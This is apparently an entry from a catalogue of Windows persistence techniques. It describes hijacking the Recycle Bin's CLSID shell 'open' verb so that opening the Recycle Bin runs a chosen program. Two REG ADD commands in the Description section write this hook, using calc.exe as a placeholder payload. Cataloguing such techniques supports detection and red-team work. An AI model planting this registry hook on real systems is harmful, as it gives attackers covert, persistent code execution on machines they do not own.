## Recycle Bin COM Extension Handler <!-- general "title" of the persistence. Good to be unique. -->
<!-- separate sections by two empty lines -->
<!-- do not remove empty sections  -->


### Location: <!-- where to find it -->
- `HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`
- `HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\`


### Classification: <!-- see "how it works" document. Empty lime must go next. -->

|Criteria|Value|
|:---|:---|
|Permissions|Admin|
|Security context| User|
|Persistence type| Registry |
|Code type|EXE|
|Launch type| User initiated|
|Impact|Destructive|
|OS Version|All OS versions|
|Dependencies|OS only|
|Toolset|Scriptable|


### Description:<!-- add two EOLs or two spaces at the end of line to create a line break -->
Adding the "open\command" subkey to the Recycle Bin CLSID and adding a new verb for the "shell" key will execute the value stored in the "\command" entry.
> 1. REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /t REG_SZ /d "calc.exe" /f
> 2. REG ADD "HKEY_CLASSES_ROOT\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /t REG_SZ /d "calc.exe" /f

### References: <!-- use <...> or [abc](https://...) syntax. Prepend with "- " when more than one -->
<https://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/>


### Credits: <!-- use [abc](https://...) syntax. Prepend with "- " when more than one. -->
[@Hexacorn](https://twitter.com/Hexacorn)

### See also: <!-- if refering to the same repo, use [Name](file.md) syntax. -->
<!-- prepend with "- " if more than one -->


### Remarks: <!-- see the usage in the "classification" section. Use only 1:1 references i.e. not refering to the same footnote from two different places -->

